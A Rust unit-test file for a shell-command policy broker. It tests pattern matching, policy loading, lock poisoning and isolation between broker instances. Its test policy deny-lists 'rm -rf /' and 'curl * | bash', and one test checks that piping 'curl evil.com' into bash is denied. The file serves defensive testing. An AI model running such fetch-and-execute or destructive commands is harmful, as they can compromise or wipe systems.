use super::*;
use std::sync::{Arc, Barrier, RwLock};
use substrate_common::WorldFsMode;
use tempfile::tempdir;

fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
    let cloned = Arc::clone(lock);
    let _ = std::thread::spawn(move || {
        let _guard = cloned.write().unwrap();
        panic!("poison lock");
    })
    .join();
}

#[test]
fn test_broker_creation() {
    let broker = Broker::new();
    assert!(broker.is_observe_only());
}

#[test]
fn test_pattern_matching() {
    assert!(matches_pattern(
        "curl http://example.com | bash",
        "curl * | bash"
    ));
    assert!(matches_pattern("npm install", "npm install"));
    assert!(!matches_pattern("cargo build", "npm install"));
    assert!(matches_pattern("git clone repo", "git clone"));
}

#[test]
fn test_quick_check_allow() {
    let broker = Broker::new();
    let result = broker
        .quick_check(&["echo".into(), "hello".into()], "/tmp")
        .unwrap();
    assert!(matches!(result, Decision::Allow));
}

#[test]
fn test_load_policy() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    let broker = Broker::new();

    let policy_content = r#"
id: test-policy
name: Test Policy
fs_read:
  - /tmp/*
fs_write:
  - /tmp/*
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
"#;
    std::fs::write(&policy_path, policy_content).unwrap();

    broker.load_policy(&policy_path).expect("load policy");

    let policy = broker.policy.read().unwrap();
    assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);

    // Test that denied command is blocked (in enforce mode)
    broker.set_observe_only(false);
    let result = broker
        .quick_check(
            &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
            "/tmp",
        )
        .unwrap();
    assert!(matches!(result, Decision::Deny(_)));
}

#[test]
fn poisoned_policy_lock_returns_error_in_evaluate() {
    let broker = Broker::new();
    poison_rwlock(&broker.policy);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
    assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

    let err = result
        .unwrap()
        .expect_err("expected poisoned lock to return error");
    assert!(
        err.to_string()
            .contains("Failed to acquire policy read lock"),
        "unexpected error: {err}"
    );

    broker.policy.clear_poison();
}

#[test]
fn poisoned_approvals_lock_returns_error() {
    let broker = Broker::new();
    {
        let mut policy = broker.policy.write().unwrap();
        policy.require_approval = true;
    }
    broker.set_observe_only(false);
    poison_rwlock(&broker.approvals);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
    assert!(
        result.is_ok(),
        "broker.evaluate panicked with poisoned approvals"
    );

    let err = result
        .unwrap()
        .expect_err("expected approval read failure to return error");
    assert!(
        err.to_string().contains("approvals read lock"),
        "unexpected error: {err}"
    );

    broker.approvals.clear_poison();
}

#[test]
fn broker_handles_remain_isolated_in_parallel() {
    let dir = tempdir().unwrap();
    let policy_a = dir.path().join("policy_a.yaml");
    let policy_b = dir.path().join("policy_b.yaml");

    std::fs::write(
        &policy_a,
        r#"
id: alpha
name: Alpha Policy
fs_read: []
fs_write: []
net_allowed: []
cmd_allowed:
  - alpha-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
"#,
    )
    .unwrap();

    std::fs::write(
        &policy_b,
        r#"
id: beta
name: Beta Policy
fs_read: []
fs_write: []
net_allowed: []
cmd_allowed:
  - beta-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
"#,
    )
    .unwrap();

    let broker_a = BrokerHandle::new();
    broker_a.initialize(Some(&policy_a)).unwrap();
    broker_a.set_observe_only(false);

    let broker_b = BrokerHandle::new();
    broker_b.initialize(Some(&policy_b)).unwrap();

    assert!(
        broker_b.is_observe_only(),
        "changing one broker handle should not affect another"
    );
    broker_b.set_observe_only(false);

    let barrier = Arc::new(Barrier::new(2));
    let thread_a = {
        let barrier = barrier.clone();
        let broker = broker_a.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("alpha-allowed", "/tmp", None)
        })
    };

    let thread_b = {
        let barrier = barrier.clone();
        let broker = broker_b.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("beta-allowed", "/tmp", None)
        })
    };

    let decision_a = thread_a.join().expect("thread a panicked").unwrap();
    let decision_b = thread_b.join().expect("thread b panicked").unwrap();

    assert!(matches!(decision_a, Decision::Allow));
    assert!(matches!(decision_b, Decision::Allow));

    assert!(matches!(
        broker_a
            .evaluate("beta-allowed", "/tmp", None)
            .expect("evaluate beta on broker_a"),
        Decision::Deny(_)
    ));
    assert!(matches!(
        broker_b
            .evaluate("alpha-allowed", "/tmp", None)
            .expect("evaluate alpha on broker_b"),
        Decision::Deny(_)
    ));
}

#[test]
fn invalid_world_fs_mode_in_policy_surfaces_error() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
id: bad-fs-mode
name: Invalid fs mode
world_fs_mode: invalid
"#,
    )
    .unwrap();

    let broker = Broker::new();
    let result = broker.load_policy(&policy_path);
    assert!(
        result.is_err(),
        "expected invalid world_fs_mode to fail parsing"
    );
}
